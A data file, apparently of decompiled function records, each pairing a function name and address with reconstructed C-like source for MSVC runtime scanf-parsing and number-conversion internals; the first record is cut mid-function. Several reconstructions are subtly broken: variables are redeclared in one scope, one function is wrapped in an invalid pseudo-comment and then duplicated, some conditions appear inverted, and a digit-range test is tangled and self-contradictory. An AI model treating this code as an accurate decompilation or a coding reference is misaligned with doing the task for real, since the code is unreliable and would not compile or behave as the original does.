((byte)shiftCount & 0x1f); \n                        }\n                    }\n                    intermediateResult = __aulldvrm(finalValue, uStack_40, param2Value, 0); \n                    stackValue2 = (int)(intermediateResult >> 0x20); \n                    intermediateValue5 = (uint)intermediateResult; \n                    ulonglong finalValue = (ulonglong)(stackValue3); \n                    tempValue3 = 0; \n                    if (stackValue2 != 0) { \n                        longlong lVar14 = __allmul((uint)(intermediateResult - 0xffffffff), (uint)(intermediateResult - 0xffffffff >> 0x20), param2Value, 0); \n                        finalValue = lVar14 + finalValue; \n                        tempValue3 = (uint)(finalValue >> 0x20); \n                        stackValue3 = 0xffffffff; \n                    }\n                    stackValue2 = (int)(stackValue3 >> 0x20); \n                    finalValue = (uint)finalValue; \n                    if ((int)(finalValue >> 0x20) == 0) { \n                        while (true) { \n                            uint finalCounter = (uint)stackValue3; \n                            intermediateValue5 = stackValue1; \n                            finalValue = __allmul(previousParam2Value, 0, finalCounter, (uint)(stackValue3 >> 0x20)); \n                            if (finalValue <= CONCAT44(finalValue, intermediateValue5)) break; \n                            bool bVar12 = finalCounter != 0; \n                            finalCounter = finalCounter - 1; \n                            stackValue2 = stackValue2 + -1 + (uint)bVar12; \n                            bVar12 = CARRY4(finalValue, param2Value); \n                            finalValue = finalValue + param2Value; \n                            stackValue3 = CONCAT44(stackValue2, finalCounter); \n                            if (tempValue3 + bVar12 != 0) break; \n                            tempValue3 = 0; \n                        }\n                        intermediateResult = CONCAT44(stackValue2, finalCounter); \n                    }\n                    if (intermediateResult != 0) { \n                        finalCounter = 0; \n                        finalValue = 0; \n                        if (param2Value != 0) { \n                            param1Pointer = param_2 + 1; \n                            uint localParam2 = param2Value; \n                            param1EndPointer = resultPointer; \n                            do {\n                                longlong lVar14 = (stackValue3 & 0xffffffff) * (ulonglong)*param1Pointer; \n                                tempValue1 = (uint)lVar14; \n                                tempValue2 = finalCounter + tempValue1; \n                                finalCounter = finalValue + (int)((ulonglong)lVar14 >> 0x20) + stackValue3._4_4_ * *param1Pointer + (uint)CARRY4(finalCounter, tempValue1); \n                                finalValue = 0; \n                                if (*param1EndPointer < tempValue2) { \n                                    bool bVar12 = 0xfffffffe < finalCounter; \n                                    finalCounter = finalCounter + 1; \n                                    finalValue = (uint)bVar12; \n                                }\n                                *param1EndPointer = *param1EndPointer - tempValue2; \n                                param1EndPointer = param1EndPointer + 1; \n                                param1Pointer = param1Pointer + 1; \n                                localParam2 = localParam2 - 1; \n                            } while (localParam2 != 0); \n                        }\n                        if ((finalValue != 0) || (uStack_40 < finalCounter)) { \n                            if (param2Value != 0) { \n                                finalCounter = 0; \n                                param1Pointer = resultPointer; \n                                finalValue = param2Value; \n                                param1EndPointer = param_2; \n                                do {\n                                    param1EndPointer = param1EndPointer + 1; \n                                    tempValue1 = *param1Pointer; \n                                    tempValue2 = *param1EndPointer; \n                                    finalValue = tempValue1 + *param1EndPointer; \n                                    *param1Pointer = finalValue + finalCounter; \n                                    finalCounter = (uint)CARRY4(tempValue1, tempValue2) + (uint)CARRY4(finalValue, finalCounter); \n                                    finalValue = finalValue - 1; \n                                    param1Pointer = param1Pointer + 1; \n                                } while (finalValue != 0); \n                            }\n                            intermediateResult = intermediateResult - 1; \n                        }\n                        localParam2 = totalLength - 1; \n                    }\n                    stackValue2 = (int)(intermediateResult >> 0x20); \n                    uint finalLowValue = (uint)intermediateResult; \n                    resultPointer = resultPointer + -1; \n                    intermediateValue1 = intermediateValue1 + -1; \n                    param1EndPointer = param1EndPointer + -1; \n                    totalLength = totalLength - 1; \n                } while (-1 < (int)intermediateValue1); \n            }\n            finalValue = localParam2 + 1; \n            if (finalValue < *param_1) { \n                param1EndPointer = param_1 + localParam2 + 2; \n                finalCounter = finalValue; \n                do {\n                    *param1EndPointer = 0; \n                    param1EndPointer = param1EndPointer + 1; \n                    finalCounter = finalCounter + 1; \n                } while (finalCounter < *param_1); \n            }\n            *param_1 = finalValue; \n            while ((finalValue != 0 && (param_1[*param_1] == 0))) { \n                finalValue = *param_1 - 1; \n                *param_1 = finalValue; \n            }\n            return CONCAT44(stackValue3, finalLowValue); \n        }\n    }\n    return 0; \n}"}
{"Function Name": "__crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get", "Address": "10022bbe", "Source Code": "wchar_t __thiscall\n__crt_strtox::\ninput_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get\n(input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*this)\n{\n    \n    uint *puVar1 = (uint *)(this + 0x10);\n    \n    \n    uint uVar2 = *puVar1;\n    \n    \n    *puVar1 = uVar2 + 1;\n    \n    \n    \n    *(uint *)(this + 0x14) += (uint)(0xfffffffe < uVar2);\n    \n    \n    uVar2 = *(uint *)(this + 0xc);\n    \n    \n    if (((*(uint *)(this + 8) | uVar2) == 0 || *(uint *)(this + 0x14) < uVar2) ||\n        (*(uint *)(this + 0x14) <= uVar2 && *(uint *)(this + 0x10) <= *(uint *)(this + 8))) &&\n        \n        (wchar_t wVar3 = __crt_stdio_input::string_input_adapter<wchar_t>::get\n        (*(string_input_adapter<wchar_t> **)this), wVar3 != L'\\xffff')) {\n        \n        return wVar3;\n    }\n    \n    \n    return L'\\0';\n}"}
{"Function Name": "__crt_stdio_input::string_input_adapter<wchar_t>::get", "Address": "10022bf7", "Source Code": "ushort __thiscall\n__crt_stdio_input::string_input_adapter<wchar_t>::get(string_input_adapter<wchar_t> *this)\n{\n    \n    ushort *puVar2 = *(ushort **)(this + 8);\n    \n    \n    if (puVar2 == *(ushort **)(this + 4)) {\n        \n        return 0xffff;\n    }\n    \n    \n    *(ushort **)(this + 8) = puVar2 + 1;\n    \n    \n    return *puVar2;\n}"}
{"Function Name": "__crt_stdio_input::scanset_buffer<wchar_t>::invert", "Address": "10022c11", "Source Code": "void __thiscall __crt_stdio_input::scanset_buffer<wchar_t>::invert(scanset_buffer<wchar_t> *this)\n{\n    \n    byte *dataPointer = scanset_storage<2>::data((scanset_storage<2> *)this);\n    \n    \n    uint bytesToInvert = ~-(uint)(dataPointer + 0x2000 < dataPointer) & (int)(dataPointer + 0x2000) - (int)dataPointer;\n    \n    \n    for (uint currentIndex = 0; currentIndex != bytesToInvert; currentIndex++) {\n        \n        *dataPointer++ = ~*dataPointer;\n    }\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::is_character_allowed_in_string", "Address": "10022c39", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::is_character_allowed_in_string\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nconversion_mode param_1, ushort param_2)\n{\n    \n    if (param_2 != 0xffff) {\n        \n        if (param_1 == 0) {\n            return true;\n        }\n        \n        if (param_1 == 1) {\n            return param_2 == 0x20 || param_2 <= 9;\n        }\n        \n        if (param_1 == 8) {\n            return !scanset_buffer<wchar_t>::test((scanset_buffer<wchar_t> *)(this + 0x4c), param_2);\n        }\n    }\n    \n    return false;\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::length", "Address": "10022c86", "Source Code": "uint __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::length(format_string_parser<wchar_t> *this)\n{\n    \n    int iVar1 = *(int *)(this + 0x30);\n    \n    \n    if (iVar1 < 0) {\n        return 0; \n    }\n    \n    \n    if (iVar1 > 1) {\n        \n        if (iVar1 > 6) {\n            \n            if (iVar1 == 7) {\n                \n                return to_floating_point_length(*(length_modifier *)(this + 0x28));\n            }\n            \n            if (iVar1 == 9) {\n                return 0; \n            }\n        }\n        \n        return to_integer_length(*(length_modifier *)(this + 0x28));\n    }\n    \n    \n    return (this[0x2c] != (format_string_parser<wchar_t>)0x0) + 1;\n}"}
{"Function Name": "__crt_strtox::floating_point_value::normal_mantissa_mask", "Address": "10022cc7", "Source Code": "__uint64 __thiscall\n__crt_strtox::floating_point_value::normal_mantissa_mask(floating_point_value *this)\n{\n    \n    return (this[4] != (floating_point_value)0x0) \n        ? 0x1fffffffffffff \n        : 0xffffff;        \n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process", "Address": "10022cde", "Source Code": "int __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this)\n{\n    \n    string_input_adapter<wchar_t> *this_00 = (string_input_adapter<wchar_t> *)(this + 8);\n    \n    \n    if (!string_input_adapter<wchar_t>::validate(this_00) || \n        !format_string_parser<wchar_t>::validate((format_string_parser<wchar_t> *)(this + 0x18))) {\n        return -1;\n    }\n    \n    while (format_string_parser<wchar_t>::advance((format_string_parser<wchar_t> *)(this + 0x18))) {\n        \n        if (!process_state(this)) {\n            break;\n        }\n    }\n    \n    int iVar4 = *(int *)(this + 0x58);\n    \n    \n    if (*(int *)(this + 0x5c) == 0) {\n        ushort uVar3 = string_input_adapter<wchar_t>::get(this_00);\n        \n        \n        if (uVar3 == 0xffff) {\n            return -1;\n        }\n        \n        \n        string_input_adapter<wchar_t>::unget(this_00, uVar3);\n    }\n    \n    if ((*(uint *)this & 1) != 0) {\n        int iVar1 = *(int *)(this + 0x24);\n        \n        \n        if (iVar1 != 0) {\n            int *piVar5 = (int *)FUN_100253b8();\n            *piVar5 = iVar1;\n            FUN_1001de96();\n        }\n    }\n    \n    \n    return iVar4;\n}"}
{"Function Name": "FUN_10022d88", "Address": "10022d88", "Source Code": "\\*\nbool __fastcall\nFUN_10022d88(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_1)\n{\n    bool bVar1; \n    uint uVar2; \n    conversion_mode cVar3; \n    \n    switch(*(undefined4 *)(param_1 + 0x48)) {\n        case 0: \n        case 1: \n            cVar3 = *(undefined4 *)(param_1 + 0x48); \n            goto LAB_10022d99; \n        case 2: \n            bVar1 = true; \n            uVar2 = 0; \n            break; \n        case 3: \n            bVar1 = true; \n            goto LAB_10022db3; \n        case 4: \n            bVar1 = false; \n            uVar2 = 8; \n            break; \n        case 5: \n            bVar1 = false; \n            LAB_10022db3: \n            uVar2 = 10; \n            break; \n        case 6: \n            bVar1 = false; \n            uVar2 = 0x10; \n            break; \n        case 7: \n            \n            __crt_stdio_input::\n            input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_::\n            process_whitespace(param_1);\n            \n            uVar2 = __crt_stdio_input::format_string_parser<wchar_t>::length\n            ((format_string_parser<wchar_t> *)(param_1 + 0x18));\n            \n            if (uVar2 == 4) {\n                \n                bVar1 = __crt_stdio_input::\n                input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n                process_floating_point_specifier_t<float>(param_1);\n                return bVar1; \n            }\n            if (uVar2 == 8) {\n                \n                bVar1 = __crt_stdio_input::\n                input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n                process_floating_point_specifier_t<double>(param_1);\n                return bVar1; \n            }\n            return false; \n        case 8: \n            cVar3 = 8; \n            LAB_10022d99: \n            \n            bVar1 = __crt_stdio_input::\n            input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n            process_string_specifier(param_1,cVar3);\n            return bVar1; \n        case 9: \n            \n            if (param_1[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\n                \n                bVar1 = __crt_stdio_input::\n                input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n                write_integer(param_1,(ulonglong)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 8) >> 1),\n                false);\n                return bVar1; \n            }\n            return true; \n        default: \n            return false; \n    }\n    \n    bVar1 = __crt_stdio_input::\n    input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\n    process_integer_specifier(param_1,uVar2,bVar1);\n    return bVar1; \n}\n*\\ \n \nbool __fastcall\nFUN_10022d88(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n*param_1)\n{\nbool bVar1;\nuint uVar2;\nconversion_mode cVar3;\nswitch(*(undefined4 *)(param_1 + 0x48)) {\ncase 0:\ncase 1:\ncVar3 = *(undefined4 *)(param_1 + 0x48);\ngoto LAB_10022d99;\ncase 2:\nbVar1 = true;\nuVar2 = 0;\nbreak;\ncase 3:\nbVar1 = true;\ngoto LAB_10022db3;\ncase 4:\nbVar1 = false;\nuVar2 = 8;\nbreak;\ncase 5:\nbVar1 = false;\nLAB_10022db3:\nuVar2 = 10;\nbreak;\ncase 6:\nbVar1 = false;\nuVar2 = 0x10;\nbreak;\ncase 7:\n__crt_stdio_input::\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nprocess_whitespace(param_1);\nuVar2 = __crt_stdio_input::format_string_parser<wchar_t>::length\n((format_string_parser<wchar_t> *)(param_1 + 0x18));\nif (uVar2 == 4) {\nbVar1 = __crt_stdio_input::\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nprocess_floating_point_specifier_t<float>(param_1);\nreturn bVar1;\n}\nif (uVar2 == 8) {\nbVar1 = __crt_stdio_input::\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nprocess_floating_point_specifier_t<double>(param_1);\nreturn bVar1;\n}\nreturn false;\ncase 8:\ncVar3 = 8;\nLAB_10022d99:\nbVar1 = __crt_stdio_input::\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nprocess_string_specifier(param_1,cVar3);\nreturn bVar1;\ncase 9:\nif (param_1[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_)0x0) {\nbVar1 = __crt_stdio_input::\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nwrite_integer(param_1,(ulonglong)(*(int *)(param_1 + 0x10) - *(int *)(param_1 + 8) >> 1),\nfalse);\nreturn bVar1;\n}\nreturn true;\ndefault:\nreturn false;\n}\nbVar1 = __crt_stdio_input::\ninput_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::\nprocess_integer_specifier(param_1,uVar2,bVar1);\nreturn bVar1;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_integer_specifier", "Address": "10022e2c", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_integer_specifier\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nuint param_1,bool param_2)\n{\n    bool bVar1; \n    __uint64 _Var2; \n    undefined auStack_38[24]; \n    \n    process_whitespace(this); \n    \n    make_input_adapter_character_source<>(auStack_38, this + 8, *(undefined4 *)(this + 0x38), *(undefined4 *)(this + 0x3c), (undefined *)((int)this + 3));\n    \n    \n    _Var2 = FUN_1001f689(*(__acrt_ptd ***)(this + 0x50));\n    \n    \n    if (this[0x30] == (input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>)0x0) {\n        \n        bVar1 = write_integer(this, _Var2, true);\n    } else {\n        \n        bVar1 = true;\n    }\n    \n    return bVar1; \n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_literal_character", "Address": "10022e92", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_literal_character\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this)\n{\n    \n    ushort uVar1 = string_input_adapter<wchar_t>::get((string_input_adapter<wchar_t> *)(this + 8));\n    \n    \n    if (uVar1 != 0xffff) {\n        \n        if (uVar1 == *(ushort *)(this + 0x2c)) {\n            \n            return true;\n        }\n        \n        string_input_adapter<wchar_t>::unget((string_input_adapter<wchar_t> *)(this + 8), uVar1);\n    }\n    \n    \n    return false;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_state", "Address": "10022ec7", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_state(input_processor<wchar_t,class ___crt_stdio_input::string_input_adapter<wchar_t>_>\n*this)\n{\n    \n    int iVar1 = *(int *)(this + 0x28);\n    \n    \n    if (iVar1 == 2) {\n        return process_whitespace(this); \n    }\n    \n    \n    if (iVar1 == 3) {\n        return process_literal_character(this); \n    }\n    \n    \n    if (iVar1 == 4) {\n        \n        if (FUN_10022d88(this)) {\n            *(int *)(this + 0x5c) += 1; \n            return true; \n        }\n    }\n    \n    \n    return false;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_string_specifier", "Address": "10022efd", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_string_specifier\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this,\nconversion_mode param_1)\n{\n    \n    if (param_1 == 1) {\n        \n        process_whitespace(this);\n    }\n    \n    uint uVar2 = format_string_parser<wchar_t>::length((format_string_parser<wchar_t> *)(this + 0x18));\n    \n    if (uVar2 == 1) {\n        return process_string_specifier_tchar<char>(this,param_1,'\\0');\n    }\n    \n    else if (uVar2 == 2) {\n        return process_string_specifier_tchar<wchar_t>(this,param_1,L'\\0');\n    }\n    \n    return false;\n}"}
{"Function Name": "__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>::process_whitespace", "Address": "10022f45", "Source Code": "bool __thiscall\n__crt_stdio_input::input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_>\n::process_whitespace\n(input_processor<wchar_t,class___crt_stdio_input::string_input_adapter<wchar_t>_> *this)\n{\n    \n    \n    ushort uVar1 = skip_whitespace<class___crt_stdio_input::string_input_adapter,wchar_t>\n    ((string_input_adapter<wchar_t> *)(this + 8), \n    *(__crt_locale_pointers **)(this + 0x50)); \n    \n    \n    string_input_adapter<wchar_t>::unget((string_input_adapter<wchar_t> *)(this + 8), uVar1);\n    \n    return true;\n}"}
{"Function Name": "__crt_stdio_input::scanset_buffer<wchar_t>::reset", "Address": "10022f65", "Source Code": "void __thiscall __crt_stdio_input::scanset_buffer<wchar_t>::reset(scanset_buffer<wchar_t> *scansetBuffer)\n{\n    \n    uchar *dataBuffer = scanset_storage<2>::data((scanset_storage<2> *)scansetBuffer);\n    \n    \n    if (dataBuffer != (uchar *)0x0) {\n        \n        _memset(dataBuffer, 0, 0x2000);\n    }\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::reset_token_state_for_error", "Address": "10022f7f", "Source Code": "void __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::reset_token_state_for_error\n(format_string_parser<wchar_t> *this, int param_1)\n{\n    \n    this[0x10] = 0;\n    \n    \n    this[0x14] = 0;\n    \n    \n    this[0x18] = (format_string_parser<wchar_t>)0x0;\n    \n    \n    this[0x20] = 0;\n    \n    \n    this[0x24] = 0;\n    \n    \n    this[0x28] = 0;\n    \n    \n    this[0x2c] = (format_string_parser<wchar_t>)0x0;\n    \n    \n    this[0x30] = 0;\n    \n    \n    this[0xc] = param_1;\n    \n    \n    return;\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::scan_conversion_specifier", "Address": "10022fcf", "Source Code": "bool __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::scan_conversion_specifier\n(format_string_parser<wchar_t> *this)\n{\n    \n    ushort uVar1 = **(ushort **)(this + 8);\n    \n    \n    if (uVar1 < 0x65) {\n        \n        if (uVar1 == 100) {\n            *(undefined4 *)(this + 0x30) = 3; \n            goto LAB_1002308a; \n        }\n        \n        if (uVar1 < 0x54) {\n            \n            if (uVar1 == 0x53) goto LAB_10023105; \n            \n            if (uVar1 != 0x41) {\n                \n                if (uVar1 == 0x43) goto LAB_10023047; \n                \n                if (uVar1 < 0x45) {\n                    reset_token_state_for_error(this, 0x16); \n                    return false; \n                }\n                \n                if (uVar1 == 0x49) goto LAB_1002301d; \n            }\n        } else {\n            \n            if (uVar1 == 0x58) goto LAB_100230d6; \n            \n            if (uVar1 == 0x5b) {\n                set_wide_for_c_s_or_scanset(this); \n                *(int *)(this + 8) += 2; \n                *(undefined4 *)(this + 0x30) = 8; \n                return SUB41(FUN_100234b6(this), 0); \n            }\n            \n            if (uVar1 == 0x61 || uVar1 == 99) {\n                \n                if ((*(uint *)(this + 0x20) | *(uint *)(this + 0x24)) == 0) {\n                    *(undefined4 *)(this + 0x24) = 0; \n                    *(undefined4 *)(this + 0x20) = 1; \n                }\n                set_wide_for_c_s_or_scanset(this); \n                *(undefined4 *)(this + 0x30) = 0; \n                goto LAB_10023113; \n            }\n        }\n        *(undefined4 *)(this + 0x30) = 7; \n    } else {\n        \n        if (uVar1 < 0x71) {\n            \n            if (uVar1 != 0x70) {\n                \n                if (uVar1 != 0x69) {\n                    \n                    if (uVar1 == 0x6e) {\n                        *(undefined4 *)(this + 0x30) = 9; \n                    } else if (uVar1 == 0x6f) {\n                        *(undefined4 *)(this + 0x30) = 4; \n                    } else {\n                        reset_token_state_for_error(this, 0x16); \n                        return false; \n                    }\n                    goto LAB_1002308a; \n                }\n                *(undefined4 *)(this + 0x30) = 2; \n                goto LAB_1002308a; \n            }\n            *(undefined4 *)(this + 0x28) = 9; \n        } else {\n            \n            if (uVar1 == 0x73) {\n                LAB_10023105:\n                set_wide_for_c_s_or_scanset(this); \n                *(undefined4 *)(this + 0x30) = 1; \n                LAB_10023113:\n                *(int *)(this + 8) += 2; \n                return true; \n            }\n            \n            if (uVar1 == 0x75) {\n                *(undefined4 *)(this + 0x30) = 5; \n                goto LAB_1002308a; \n            }\n            \n            if (uVar1 != 0x78) {\n                reset_token_state_for_error(this, 0x16); \n                return false; \n            }\n        }\n        LAB_100230d6:\n        *(undefined4 *)(this + 0x30) = 6; \n    }\n    LAB_1002308a:\n    *(ushort **)(this + 8) += 1; \n    return true; \n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_assignment_suppressor", "Address": "1002311b", "Source Code": "void __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_assignment_suppressor\n(format_string_parser<wchar_t> *this)\n{\n    \n    if (**(short **)(this + 8) == 0x2a) {\n        \n        this[0x18] = (format_string_parser<wchar_t>)0x1;\n        \n        *(short **)(this + 8) += 1;\n    }\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_field_width", "Address": "1002312f", "Source Code": "bool __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_field_width\n(format_string_parser<wchar_t> *this)\n{\n    \n    ushort uVar1 = **(ushort **)(this + 8);\n    uint uVar3 = (uint)uVar1; \n    uint uVar2 = 0xffffffff; \n    \n    if (0x2f < uVar1) {\n        \n        if (uVar3 < 0x3a) {\n            uVar2 = uVar3 - 0x30; \n        } else if (uVar1 < 0xff10) { \n            \n            if (uVar1 >= 0x660 && (uVar1 < 0x669 || (uVar1 >= 0x6f0 && (uVar1 < 0x6f9 || (uVar1 >= 0x966 && (uVar1 < 0x96f || (uVar1 >= 0x9e6 && (uVar1 < 0x9ef || (uVar1 >= 0xa66 && (uVar1 < 0xa6f || (uVar1 >= 0xae6 && (uVar1 < 0xaef || (uVar1 >= 0xb66 && (uVar1 < 0xb6f || (uVar1 >= 0xc66 && (uVar1 < 0xc6f || (uVar1 >= 0xce6 && (uVar1 < 0xcef || (uVar1 >= 0xd66 && (uVar1 < 0xd6f || (uVar1 >= 0xe50 && (uVar1 < 0xe59 || (uVar1 >= 0xed0 && (uVar1 < 0xed9 || (uVar1 >= 0xf20 && (uVar1 < 0xf29 || (uVar1 >= 0x1040 && (uVar1 < 0x1049 || (uVar1 >= 0x17e0 && (uVar1 < 0x17e9 || (uVar1 >= 0x1810 && (0x1819 < uVar1)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) {\n                uVar2 = 0xffffffff; \n            }\n        } else if (uVar1 < 0xff1a) { \n            uVar2 = uVar3 - 0x30; \n        }\n    }\n    \n    if (uVar2 != 0xffffffff) {\n        \n        if (((uVar1 < 0x41) || (0x5a < uVar3)) && (0x19 < (ushort)(uVar1 - 0x61))) {\n            uVar2 = 0xffffffff; \n        } else {\n            uVar2 = uVar3 - 0x20; \n            if (0x19 < (ushort)(uVar1 - 0x61)) {\n                uVar2 = uVar3; \n            }\n            uVar2 -= 0x37; \n        }\n    }\n    \n    if (uVar2 < 10) {\n        int local_8 = 0; \n        longlong lVar5 = _wcstoull(*(ushort **)(this + 8), &local_8, 10); \n        \n        if ((lVar5 == 0) || (local_8 == *(int *)(this + 8))) {\n            reset_token_state_for_error(this, 0x16); \n            return false; \n        }\n        *(longlong *)(this + 0x20) = lVar5; \n        *(int *)(this + 8) = local_8; \n    }\n    return true; \n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_length_modifier", "Address": "1002335b", "Source Code": "void __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_length_modifier\n(format_string_parser<wchar_t> *this)\n{\n    \n    ushort *puVar2 = *(ushort **)(this + 8);\n    \n    ushort uVar1 = *puVar2;\n    \n    if (uVar1 < 0x6b) {\n        \n        if (uVar1 == 0x6a) {\n            \n            *(undefined4 *)(this + 0x28) = 5;\n            \n            *(ushort **)(this + 8) = puVar2 + 1;\n            return;\n        }\n        \n        if (uVar1 == 0x49) {\n            uVar1 = puVar2[1]; \n            \n            if ((uVar1 == 0x33 && puVar2[2] == 0x32) || \n                (uVar1 == 0x36 && puVar2[2] == 0x34)) {\n                \n                *(undefined4 *)(this + 0x28) = (uVar1 == 0x33) ? 9 : 10;\n                \n                *(ushort **)(this + 8) = puVar2 + 3;\n                return;\n            }\n            \n            if (uVar1 == 100 || uVar1 == 0x69 || uVar1 == 0x6f || \n                uVar1 == 0x75 || uVar1 == 0x78 || uVar1 == 0x58) {\n                \n                *(ushort **)(this + 8) = puVar2 + 1;\n                *(undefined4 *)(this + 0x28) = 9;\n                return;\n            }\n        }\n        \n        if (uVar1 == 0x4c) {\n            \n            *(undefined4 *)(this + 0x28) = 8;\n            \n            *(ushort **)(this + 8) = puVar2 + 1;\n            return;\n        }\n        \n        if (uVar1 == 0x54) {\n            \n            *(undefined4 *)(this + 0x28) = 0xb;\n            \n            *(ushort **)(this + 8) = puVar2 + 1;\n            return;\n        }\n        \n        if (uVar1 == 0x68) {\n            \n            *(undefined4 *)(this + 0x28) = (puVar2[1] == 0x68) ? 1 : 2;\n            \n            *(ushort **)(this + 8) = puVar2 + (puVar2[1] == 0x68 ? 2 : 1);\n            return;\n        }\n    } else {\n        \n        if (uVar1 == 0x6c) {\n            \n            if (puVar2[1] == 0x6c) {\n                \n                *(undefined4 *)(this + 0x28) = 4;\n                \n                *(ushort **)(this + 8) = puVar2 + 2;\n                return;\n            }\n            \n            *(undefined4 *)(this + 0x28) = 3;\n        } else if (uVar1 == 0x74) {\n            \n            *(undefined4 *)(this + 0x28) = 7;\n        } else if (uVar1 == 0x7a) {\n            \n            *(undefined4 *)(this + 0x28) = 6;\n        } else {\n            return; \n        }\n        \n        *(ushort **)(this + 8) = puVar2 + 1;\n    }\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_wide_modifier", "Address": "1002348c", "Source Code": "void __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::scan_optional_wide_modifier\n(format_string_parser<wchar_t> *this)\n{\n    \n    wchar_t wVar1 = **(wchar_t **)(this + 8);\n    \n    \n    if (wVar1 == L'w') {\n        \n        *(wchar_t **)(this + 8) += 1;\n    } \n    \n    else if (!should_default_to_wide(this, wVar1)) {\n        \n        return;\n    }\n    \n    \n    this[0x2c] = (format_string_parser<wchar_t>)0x1;\n}"}
{"Function Name": "__crt_stdio_input::scanset_buffer<wchar_t>::set", "Address": "100235c8", "Source Code": "void __thiscall\n__crt_stdio_input::scanset_buffer<wchar_t>::set(scanset_buffer<wchar_t> *this, wchar_t param_1)\n{\n    \n    uchar *puVar1 = scanset_storage<2>::data((scanset_storage<2> *)this);\n    \n    \n    puVar1[(ushort)param_1 >> 3] |= (byte)(1 << (param_1 & 7U));\n}"}
{"Function Name": "__crt_stdio_input::format_string_parser<wchar_t>::set_wide_for_c_s_or_scanset", "Address": "100235f8", "Source Code": "void __thiscall\n__crt_stdio_input::format_string_parser<wchar_t>::set_wide_for_c_s_or_scanset\n(format_string_parser<wchar_t> *this)\n{\n    \n    int iVar1 = *(int *)(this + 0x28);\n    \n    \n    if (iVar1 == 2) {\n        \n        this[0x2c] = (format_string_parser<wchar_t>)0x0;\n    } \n    \n    else if (iVar1 == 3 || iVar1 == 4 || iVar1 == 8) {\n        \n        this[0x2c] = (format_string_parser<wchar_t>)0x1;\n    }\n}"}
